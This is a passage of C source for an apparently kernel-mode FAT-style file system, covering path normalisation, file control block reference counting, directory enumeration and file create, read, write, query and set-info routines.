			memcpy(&FileName->Extension, String->Buffer + NameLen + 1, ExtLen);
		Ret = TRUE;
	}
	
	return(Ret);
}


static	VOID VfatFileNameToString(PFAT_NAME FileName, PANSI_STRING String)
{
	ULONG	Length;
	ASSERT(String->MaximumLength >= (sizeof(FAT_NAME) + 2));

	memset(String->Buffer, 0, (sizeof(FAT_NAME) + 2));
	memcpy(String->Buffer, FileName->Name, VFAT_NAME_LENGTH);

	String->Length = VFAT_NAME_LENGTH;

	Length = AnsiStrChr(String, 0);
	if (FileName->Extension[0])
	{
		String->Buffer[Length] = '.';
		memcpy(String->Buffer + Length + 1, FileName->Extension, VFAT_EXTENSION_LENGTH);
		String->Length += (VFAT_EXTENSION_LENGTH + 1);
		Length = AnsiStrChr(String, 0);
	}

	String->Length = (USHORT)Length;
}



static NTSTATUS VfatReferenceFcb(PVFAT_FCB* pFcb, PANSI_STRING pPath, DWORD CreateOptions, DWORD Flags)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PVFAT_FCB   ParentFcb, Fcb = NULL;
	LONG		Index;
	ANSI_STRING	ShortName = {0};
	FAT_NAME	FatName;
	// Copying path ANSI_STRING since it will be changed
	ANSI_STRING	Path = {pPath->Length, pPath->MaximumLength, pPath->Buffer};


	if (Path.Length == 0 || (Path.Length == 1 && Path.Buffer[0] == '\\'))
	{
		// Referencing the Root directory
		VfatLockVolume(&g_VfatVolume);

		ASSERT(g_VfatVolume.RootFcb);

		if (Fcb = g_VfatVolume.RootFcb)
			VfatReferenceObject(Fcb);

		VfatUnlockVolume(&g_VfatVolume);

		if (Fcb)
		{
			*pFcb = Fcb;
			ntStatus = STATUS_SUCCESS;
		}
	}	// if (Path->Length == 0 || (Path->Length == 1 && Path->Buffer[0] == '\\'))
	else
	{
		Index = AnsiStrRChr(&Path, '\\') + 1;
		ShortName.Length = Path.Length - (USHORT)Index;
		ShortName.MaximumLength = Path.MaximumLength - (USHORT)Index;
		ShortName.Buffer = Path.Buffer + Index;

		Path.Length = (USHORT)Index - 1;

		if (Index && ShortName.Length <= VFAT_MAX_NAME_LENGTH)
		{
			VfatStringToFileName(&ShortName, &FatName);
			ntStatus = VfatReferenceFcb(&ParentFcb, &Path, FILE_OPEN, FILE_ATTRIBUTE_DIRECTORY);
			if (NT_SUCCESS(ntStatus))
			{
				PLIST_ENTRY pEntry;

				VfatLockObject(ParentFcb);

				// Looking for the file within child Fcb list first
				pEntry = ParentFcb->FcbListHead.Flink;
				while(pEntry != &ParentFcb->FcbListHead)
				{
					Fcb = CONTAINING_RECORD(pEntry, VFAT_FCB, FcbListEntry);
					if (memcmp(&FatName, &Fcb->DirEntry.FileName, sizeof(FAT_NAME)) == 0)
						break;
										
					Fcb = NULL;
					pEntry = pEntry->Flink;
				}	// while(pEntry != &ParentFcb->FcbListHead)

				if (Fcb)
				{
					// The file exist within parent's FCB list, checking if we are trying to open existing
					if (!(CreateOptions & (FILE_OPEN << 24)))
					{
						Fcb = NULL;
						ntStatus = STATUS_OBJECT_NAME_COLLISION;
					}				
				}
				else
				{
					// No file found within parent's FCB list
					if (Fcb = VfatAllocateFcb())
					{
						// Name was not found within active FCB list, loading or creating new one
						ntStatus = VfatGetDirectoryEntry(ParentFcb, &FatName, CreateOptions, &Fcb->DirEntry);
						if (NT_SUCCESS(ntStatus))
						{
							// Found or created file directory entry
							Fcb->pVolume = ParentFcb->pVolume;
							Fcb->ParentFcb = ParentFcb;
							InsertTailList(&ParentFcb->FcbListHead, &Fcb->FcbListEntry);
						}
						else
						{
							// An error occured while looking for file directory entry
							VfatReleaseFcb(Fcb);
							Fcb = NULL;
						}
					}	// if (Fcb = VfatAllocateFcb())
				}	// if (!Fcb)

				if (Fcb)
				{
					VfatReferenceObject(Fcb);
					*pFcb = Fcb;
				}
				
				VfatUnlockObject(ParentFcb);
			}	// if (NT_SUCCESS(ntStatus))
		}	// if (Index && ShortName.Length <= VFAT_MAX_NAME_LENGTH)
		else
			ntStatus = STATUS_OBJECT_NAME_INVALID;
	}

	return(ntStatus);
}



static VOID	VfatDereferenceFcb(PVFAT_FCB Fcb)
{
	PVFAT_FCB	ParentFcb = Fcb->ParentFcb;

	ASSERT_FCB(Fcb);
	ASSERT(Fcb->ReferenceCount);

	// Root directory has no parent FCB and cannot be released
	if (!ParentFcb)
	{
		// Updating root directory info if needed
		PVFAT_VOLUME pVolume;
		VfatLockObject(Fcb);
		pVolume = Fcb->pVolume;
		if (Fcb->Flags & FCB_FLAG_DIRTY)
		{
			VfatLockVolume(pVolume);

			ASSERT(Fcb->DirEntry.Cluster > 1);
			ASSERT(Fcb->DirEntry.FileSize < 0xffff);

			pVolume->pVbr->Bpb.RDSize = (USHORT)Fcb->DirEntry.FileSize;

			VfatSaveVolumeData(pVolume);

			VfatUnlockVolume(pVolume);
		}	// if (Fcb->Flags & FCB_FLAG_DIRTY)
		VfatUnlockObject(Fcb);
	}	// if (!ParentFcb)
	else
		VfatLockObject(ParentFcb);

	if (VfatDereferenceObject(Fcb) == 0)
	{
		// Current FCB is not root directory
		VFAT_FILE_CONTEXT	FileCtx;
		ULONG	bWrite = sizeof(FAT_DIR_ENTRY);

		ASSERT(ParentFcb);
		ASSERT(IsListEmpty(&Fcb->FcbListHead));
		ASSERT(!IsListEmpty(&ParentFcb->FcbListHead));

		// Releasing File Control Block
		RemoveEntryList(&Fcb->FcbListEntry);

		// Checking if file is deleted
		if (Fcb->Flags & FCB_FLAG_DELETED)
		{
			VfatDeleteFile(Fcb);
			ParentFcb->Flags |= FCB_FLAG_DIRTY;
		}

		// Updating file directory entry
		FileCtx.Fcb = ParentFcb;
		FileCtx.FilePosition.QuadPart = (ULONGLONG)(Fcb->DirEntry.Index * sizeof(FAT_DIR_ENTRY));
		FileCtx.pPosition = &FileCtx.FilePosition;

		VfatWriteFileInternal(&FileCtx, &Fcb->DirEntry, &bWrite);	

		VfatReleaseFcb(Fcb);

		VfatUnlockObject(ParentFcb);
		VfatDereferenceFcb(ParentFcb);
	}
	else
	{	
		if (ParentFcb)
			VfatUnlockObject(ParentFcb);
	}
}


// Allocates a buffer and reads whole directory data into it.
static NTSTATUS	VfatReadDirectory(
							PVFAT_FCB		Fcb,		// FCB describes directory to read
							PFAT_DIR_ENTRY* pEntries,	// Where to store the pointer to the buffer
							PULONG			pCount		// Number of directory records
							)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PFAT_DIR_ENTRY	Entries = NULL;
	ULONG	DirSize;

	VfatLockObject(Fcb);

	if (DirSize = ((Fcb->DirEntry.FileSize + sizeof(FAT_DIR_ENTRY) - 1) & (~(sizeof(FAT_DIR_ENTRY) - 1))))
	{
		if (DirSize != Fcb->DirEntry.FileSize)
		{
			// Wrong directory size, trying to corret it
			ASSERT(FALSE);
			Fcb->DirEntry.FileSize = DirSize;
		}	// if (DirSize != Fcb->DirEntry.FileSize)

		// Allocating a pool for directory entries
		ntStatus = STATUS_INSUFFICIENT_RESOURCES;
		if (Entries = MyAllocatePool(PagedPool, DirSize))
		{
			// Loading the directory data
			VFAT_FILE_CONTEXT	FileCtx;
			FileCtx.Fcb = Fcb;
			FileCtx.FilePosition.QuadPart = 0;
			FileCtx.pPosition = &FileCtx.FilePosition;

			if (NT_SUCCESS(ntStatus = VfatReadFileInternal(&FileCtx, Entries, &DirSize)))
				*pEntries = Entries;
			else
				MyFreePool(Entries);

		}	// if (Entries = MyAllocatePool(PagedPool, DirSize))
	}	// if (DirSize =

	*pCount = DirSize / sizeof(FAT_DIR_ENTRY);

	VfatUnlockObject(Fcb);

	return(ntStatus);

}


static NTSTATUS VfatDirEntryToDirInfo(PFAT_DIR_ENTRY DirEntry, PFILE_BOTH_DIR_INFORMATION DirInfo, ULONG Length, PULONG pReturned)
{
	NTSTATUS	ntStatus = STATUS_INFO_LENGTH_MISMATCH;
	ULONG		Returned = 0;

	CHAR		NameBuffer[sizeof(FAT_NAME) + 2];
	ANSI_STRING	NameString = {0, sizeof(FAT_NAME) + 2, (PCHAR)&NameBuffer};
	UNICODE_STRING	UniName = {0};

	if (Length >= sizeof(FILE_BOTH_DIR_INFORMATION))
	{
		Returned = sizeof(FILE_BOTH_DIR_INFORMATION);

		// Extracting file name string
		VfatFileNameToString(&DirEntry->FileName, &NameString);
		ASSERT(NameString.Length <= VFAT_MAX_NAME_LENGTH);

		memset(DirInfo, 0, sizeof(FILE_BOTH_DIR_INFORMATION));
		DirInfo->AllocationSize.LowPart = (DirEntry->FileSize + VFAT_SECTOR_SIZE -1) & (~(VFAT_SECTOR_SIZE - 1));
		DirInfo->EndOfFile.LowPart = DirEntry->FileSize;
		VfatDateTimeToSysTime(&DirInfo->CreationTime, (PFAT_DATE)&DirEntry->CreateDate, (PFAT_TIME)&DirEntry->CreateTime);
				
		// Copying short file name
		UniName.MaximumLength = (NameString.MaximumLength * sizeof(WCHAR));
		UniName.Buffer = (PWSTR)&DirInfo->ShortName;
		RtlAnsiStringToUnicodeString(&UniName, &NameString, FALSE);
		DirInfo->ShortNameLength = (CCHAR)UniName.Length;
							
		if (Length >= (Returned + UniName.Length))
		{
			// Copying full file name (currently the same as short file name)
			Returned += UniName.Length;
			memcpy(DirInfo->FileName, DirInfo->ShortName, UniName.Length);
			DirInfo->FileNameLength = UniName.Length;
			ntStatus = STATUS_SUCCESS;
		}
	}	// if (Length >= sizeof(FILE_BOTH_DIR_INFORMATION))

	*pReturned = Returned;
	
	return(ntStatus);
}


static	NTSTATUS	VfatResizeFile(PVFAT_FCB Fcb, ULONG Position)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	ULONG		NumberSectors = (Position + VFAT_SECTOR_SIZE - 1) / VFAT_SECTOR_SIZE;

	// Do not delete file chaing even if truncated size == 0;
	if (NumberSectors == 0)
		NumberSectors = 1;

	if (Position < Fcb->DirEntry.FileSize)
		// Truncate the file chain
		ntStatus = VfatTruncateChain(Fcb->pVolume, Fcb->DirEntry.Cluster, NumberSectors);
	else
		// Append the file chain
		ntStatus = VfatAppendChain(Fcb->pVolume, &Fcb->DirEntry.Cluster, NumberSectors);

	Fcb->DirEntry.FileSize = Position;

	return(ntStatus);

}


static NTSTATUS	VfatNormalizePath(PANSI_STRING	DstPath, PANSI_STRING SrcPath)
{
	ULONG		NameLen = 0, i;
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	
	for (i=0; i<SrcPath->Length; i++)
	{
		CHAR c = SrcPath->Buffer[i];

		// Checking for an invalid symbol
		if (c == '*' || c == '?' || c == '/' || c == ':' || c == '=')
		{
			ntStatus = STATUS_OBJECT_NAME_INVALID;
			break;
		}
		// Checking name length
		if (c == '\\' || c == '.')
		{
			if (NameLen > VFAT_NAME_LENGTH)
			{
				ntStatus = STATUS_OBJECT_NAME_INVALID;
				break;
			}
			NameLen = 0;				
		}	// if (c == '\' || c == '.')
		else
			NameLen += 1;
	}	// for (i=0; i<SrcPath->Length, i++)

	if (NameLen > VFAT_NAME_LENGTH)
		ntStatus = STATUS_OBJECT_NAME_INVALID;

	if (NT_SUCCESS(ntStatus))
	{
		if (DstPath->MaximumLength = SrcPath->Length)
		{
			USHORT i;

			// Check if the path starts with '\'
			i = (SrcPath->Buffer[0] != '\\') ? 1 : 0;

			DstPath->MaximumLength += i + 1;
			if (DstPath->Buffer = MyAllocatePool(PagedPool, DstPath->MaximumLength))
			{
				DstPath->Buffer[0] = '\\';

				DstPath->Buffer += i;
				DstPath->MaximumLength -= i;

				// Converting Path to upper case
				RtlUpperString(DstPath, SrcPath);

				DstPath->Buffer -= i;
				DstPath->Length += i;
				DstPath->MaximumLength += i;
			}
			else
				ntStatus = STATUS_INSUFFICIENT_RESOURCES;
		}	// if (DstPath->MaximumLength = SrcPath->Length)
		else
			ntStatus = STATUS_OBJECT_NAME_INVALID;
	}	// if (NT_SUCCESS(ntStatus))

	return(ntStatus);
}




// ---- VFAT API ----------------------------------------------------------------------------------------------------------------

NTSTATUS VfatCreateFile(
					PVOID*			pContext, 
					PANSI_STRING	Path,				// ANSI string in upper case
					DWORD			DesiredAccess, 
					DWORD			SharedMode, 
					DWORD			CreateOptions,		// high 8 bits are CreateDisposion and low 24 bits are CreateOptions
					DWORD			FlagsAndAttributes,
					PLARGE_INTEGER	pFilePosition
					)
{
	NTSTATUS	ntStatus = STATUS_DEVICE_NOT_READY;
	PVFAT_FCB	Fcb;
	ANSI_STRING	NormalPath;
	PVFAT_FILE_CONTEXT	FileCtx;

	if (g_VfatVolume.Flags & VF_ACTIVE)
	{	
		if (NT_SUCCESS(ntStatus = VfatNormalizePath(&NormalPath, Path)))
		{
			if (FileCtx = MyAllocatePool(PagedPool, sizeof(VFAT_FILE_CONTEXT)))
			{
				ntStatus = VfatReferenceFcb(&Fcb, &NormalPath, CreateOptions, FlagsAndAttributes);
				if (NT_SUCCESS(ntStatus))
				{
					memset(FileCtx, 0, sizeof(VFAT_FILE_CONTEXT));
					FileCtx->Fcb = Fcb;
					FileCtx->AccessMask = DesiredAccess;
					FileCtx->pPosition = pFilePosition;
					FileCtx->pPosition->QuadPart = 0;

					*pContext = FileCtx;
				}
				else
					MyFreePool(FileCtx);
			}	// if (FileCtx = MyAllocatePool(PagedPool, sizeof(VFAT_FILE_CONTEXT)))
			else
				ntStatus = STATUS_INSUFFICIENT_RESOURCES;

			MyFreePool(NormalPath.Buffer);
		}	// if (NT_SUCCESS(ntStatus = VfatNormalizePath(&NormalPath, Path)))
	}	// if (g_VfatVolume.Flags & VF_ACTIVE)

	return(ntStatus);
}


NTSTATUS	VfatCloseHandle(PVOID Context)
{
	PVFAT_FILE_CONTEXT	FileCtx = (PVFAT_FILE_CONTEXT)Context;

	if (FileCtx->WorkBuffer)
	{
		MyFreePool(FileCtx->WorkBuffer);
		FileCtx->WorkBuffer = 0;
		FileCtx->WorkBufLen = 0;
	}
	VfatDereferenceFcb(FileCtx->Fcb);
	return(STATUS_SUCCESS);
}


NTSTATUS	VfatReadWriteFile(PVOID Context, PCHAR Buffer, ULONG Size, PLARGE_INTEGER Offset, PULONG_PTR pReturned, BOOL IsWrite)
{
	NTSTATUS	ntStatus = STATUS_ACCESS_DENIED;
	PVFAT_FILE_CONTEXT	FileCtx = (PVFAT_FILE_CONTEXT)Context;
	ULONG		bSize = Size;

	if ((IsWrite && (FileCtx->AccessMask & FILE_WRITE_DATA)) || (!IsWrite && (FileCtx->AccessMask & FILE_READ_DATA)))
	{
		ntStatus = STATUS_SUCCESS;
		if (Size)
		{
			VfatLockObject(FileCtx->Fcb);

			if (Offset->QuadPart != 0)
			{
				if (Offset->HighPart == -1)
				{
					if (Offset->LowPart == FILE_WRITE_TO_END_OF_FILE)
						FileCtx->pPosition->LowPart = FileCtx->Fcb->DirEntry.FileSize;
				}	// if (Offset->HighPart == -1)
				else
					FileCtx->pPosition->LowPart = Offset->LowPart;
			}	// if (Offset->QuadPart != 0)

			if (IsWrite)
				ntStatus = VfatWriteFileInternal(FileCtx, Buffer, &bSize);
			else
				ntStatus = VfatReadFileInternal(FileCtx, Buffer, &bSize);

			VfatUnlockObject(FileCtx->Fcb);
		}	// if (Size)
	}	// if ((IsWrite && (FileCtx->AccessMask & FILE_WRITE_DATA)) ||

	if (NT_SUCCESS(ntStatus))
		*pReturned = (ULONG_PTR)bSize;
	
	return(ntStatus);
}


NTSTATUS	VfatQueryFileInfo(PVOID Context, PVOID Buffer, ULONG Size, ULONG FileInformationClass, PULONG_PTR pReturned)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PVFAT_FILE_CONTEXT	FileCtx = (PVFAT_FILE_CONTEXT)Context;
	PVFAT_FCB Fcb = FileCtx->Fcb;

	ASSERT_FCB(Fcb);
	ASSERT(Fcb->ReferenceCount);

	VfatLockObject(Fcb);

	switch(FileInformationClass)
	{
	case FileStandardInformation:
		if (Size >= sizeof(FILE_STANDARD_INFORMATION))
		{
			PFILE_STANDARD_INFORMATION	StdInfo = (PFILE_STANDARD_INFORMATION)Buffer;

			memset(StdInfo, 0, sizeof(FILE_STANDARD_INFORMATION));
			StdInfo->AllocationSize.LowPart = (Fcb->DirEntry.FileSize + VFAT_SECTOR_SIZE -1) & (~(VFAT_SECTOR_SIZE - 1));
			StdInfo->EndOfFile.LowPart = Fcb->DirEntry.FileSize;
			StdInfo->DeletePending = (BOOLEAN)(Fcb->Flags & FCB_FLAG_DELETED);
			StdInfo->Directory = (BOOLEAN)(Fcb->Flags & FCB_FLAG_DIRECTORY);
			*pReturned = sizeof(PFILE_STANDARD_INFORMATION);
		}	// if (Size >= sizeof(FILE_STANDARD_INFORMATION))
		else
			ntStatus = STATUS_INFO_LENGTH_MISMATCH;
		break;
	case FileAccessInformation:
		if (Size >= sizeof(ACCESS_MASK))
		{
			PACCESS_MASK	AccessInfo = (PACCESS_MASK)Buffer;
			*AccessInfo = FileCtx->AccessMask;
			*pReturned = sizeof(ACCESS_MASK);
		}	// if (Size >= sizeof(ACCESS_MASK))
		else
			ntStatus = STATUS_INFO_LENGTH_MISMATCH;
		break;
	default:
		ntStatus = STATUS_INVALID_PARAMETER;
		break;
	}	// switch(FileInformationClass)

	VfatUnlockObject(Fcb);

	return(ntStatus);
}


NTSTATUS	VfatSetFileInfo(PVOID Context, PVOID Buffer, ULONG Size, ULONG FileInformationClass)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PVFAT_FILE_CONTEXT	FileCtx = (PVFAT_FILE_CONTEXT)Context;
	PVFAT_FCB	Fcb = FileCtx->Fcb;
	ULONG		Position;

	PFILE_DISPOSITION_INFORMATION	DisposeInfo;
	PFILE_END_OF_FILE_INFORMATION	EndOfFile;
	PFILE_POSITION_INFORMATION		PosInfo;

	ASSERT_FCB(Fcb);
	ASSERT(Fcb->ReferenceCount);

	VfatLockObject(Fcb);

	switch(FileInformationClass)
	{
	case FileDispositionInformation:
		if (!(FileCtx->AccessMask & DELETE))
		{
			ntStatus = STATUS_ACCESS_DENIED;
			break;
		}

		if (Size != sizeof(FILE_DISPOSITION_INFORMATION))
		{
			ntStatus = STATUS_INFO_LENGTH_MISMATCH;
			break;
		}

		DisposeInfo = (PFILE_DISPOSITION_INFORMATION)Buffer;
		if (DisposeInfo->DeleteFile)
			Fcb->Flags |= FCB_FLAG_DELETED;
		else
			Fcb->Flags &= ~FCB_FLAG_DELETED;
		break;

	case FileEndOfFileInformation:
		if (!(FileCtx->AccessMask & FILE_WRITE_DATA))
		{
			ntStatus = STATUS_ACCESS_DENIED;
			break;
		}

		if (Size != sizeof(FILE_END_OF_FILE_INFORMATION))
		{
			ntStatus = STATUS_INFO_LENGTH_MISMATCH;
			break;
		}

		EndOfFile = (PFILE_END_OF_FILE_INFORMATION)Buffer;
		Position = EndOfFile->EndOfFile.LowPart;
		ntStatus = VfatResizeFile(Fcb, Position);
		if (NT_SUCCESS(ntStatus))
			FileCtx->pPosition->QuadPart = (ULONGLONG)Position;
		break;

	default:
		ntStatus = STATUS_INVALID_PARAMETER;
		break;
	}	// switch(FileInformationClass)	

	VfatUnlockObject(Fcb);

	return(ntStatus);
}


NTSTATUS VfatQueryDirectory(PVOID Context, PCHAR Buffer, ULONG Size, ULONG FileInfoClass, ULONG Index, ULONG Flags, PULONG_PTR pReturned)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PVFAT_FILE_CONTEXT	FileCtx = (PVFAT_FILE_CONTEXT)Context;
	PVFAT_FCB	Fcb = FileCtx->Fcb;
	ULONG		EntryIndex = 0, DataLength = 0, Count = 0;
	PFAT_DIR_ENTRY CurrentEntry = NULL;

	ASSERT_FCB(Fcb);
	ASSERT(Fcb->ReferenceCount);

	switch(FileInfoClass)
	{
	case FileBothDirectoryInformation:
		ASSERT(ntStatus == STATUS_SUCCESS);
		if (!FileCtx->WorkBuffer)
			ntStatus = VfatReadDirectory(Fcb, (PFAT_DIR_ENTRY*)&FileCtx->WorkBuffer, &FileCtx->WorkBufLen);

		if (NT_SUCCESS(ntStatus))
		{

			EntryIndex = FileCtx->Index;
			if (Flags & SL_RESTART_SCAN)
				EntryIndex = 0;
	
			ntStatus = STATUS_NO_MORE_FILES;
	
			if (FileCtx->WorkBufLen == 0 || EntryIndex < FileCtx->WorkBufLen)
			{
				PFILE_BOTH_DIR_INFORMATION	CurrentInfo, LastInfo = NULL;

				// Skipping first EntryIndex entries
				CurrentEntry = (PFAT_DIR_ENTRY)FileCtx->WorkBuffer + EntryIndex;
				Count = FileCtx->WorkBufLen - EntryIndex;

				CurrentInfo = (PFILE_BOTH_DIR_INFORMATION)Buffer;
				while (Count)
				{
					FileCtx->Index += 1;
					if (CurrentEntry->FileName.Name[0])
					{
						ULONG InfoLength;

						ntStatus = VfatDirEntryToDirInfo(CurrentEntry, CurrentInfo, Size, &InfoLength);
						DataLength += InfoLength;
						Size -= InfoLength;
	
						if (!NT_SUCCESS(ntStatus))
							break;

						if (LastInfo)
							LastInfo->NextEntryOffset = (ULONG)((ULONG_PTR)CurrentInfo - (ULONG_PTR)LastInfo);

						LastInfo = CurrentInfo;
						CurrentInfo = (PFILE_BOTH_DIR_INFORMATION)((PCHAR)CurrentInfo + InfoLength);

						if (Flags & SL_RETURN_SINGLE_ENTRY)
							break;
					}	// if (CurrentEntry->FileName.Name[0])
					CurrentEntry += 1;
					Count -= 1;
				}	// while (Count)
			}	// if (EntryIndex < Count)
		}	// if (NT_SUCCESS(ntStatus) && Count != 0)
		break;

	default:
		ntStatus = STATUS_NOT_IMPLEMENTED;
		break;
	}	// switch(FileInformationClass)

	*pReturned = DataLength;

	return(ntStatus);

}


NTSTATUS VfatQueryFsInfo(PVOID* pFsInfo, PULONG	pInfoLength)
{
	NTSTATUS ntStatus = STATUS_NOT_FOUND;
	PVFS_INFORMATION	FsInfo;

	if (g_VfatVolume.Flags & VF_ACTIVE)
	{
		ULONG InfoLen = sizeof(VFS_INFORMATION) + g_VfatVolume.pDeviceName->Length + sizeof(ULONG);
		if (FsInfo = MyAllocatePool(PagedPool, InfoLen))
		{
			memset(FsInfo, 0, InfoLen);
			memcpy(&FsInfo->DeviceName, g_VfatVolume.pDeviceName->Buffer, g_VfatVolume.pDeviceName->Length);
			memcpy(&FsInfo->FsId, &g_VfatVolume.pVbr->VolumeOemId, 8);

			FsInfo->StartSector = g_VfatVolume.StartSector;
			FsInfo->NumberOfSectors = g_VfatVolume.pVbr->Bpb.FatTotalSectors + g_VfatVolume.pVbr->Bpb.SmallSectorsCount;
			FsInfo->VolumeSize = FsInfo->NumberOfSectors * VFAT_SECTOR_SIZE;
			FsInfo->BytesTotal = g_VfatVolume.pVbr->Bpb.FatTotalSectors * VFAT_SECTOR_SIZE;
			FsInfo->BytesFree = 0;

			*pFsInfo = FsInfo;
			*pInfoLength = InfoLen;
			ntStatus = STATUS_SUCCESS;
		}
		else
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	}	// 	if (g_VfatVolume.Flags & VF_ACTIVE)
	return(ntStatus);
}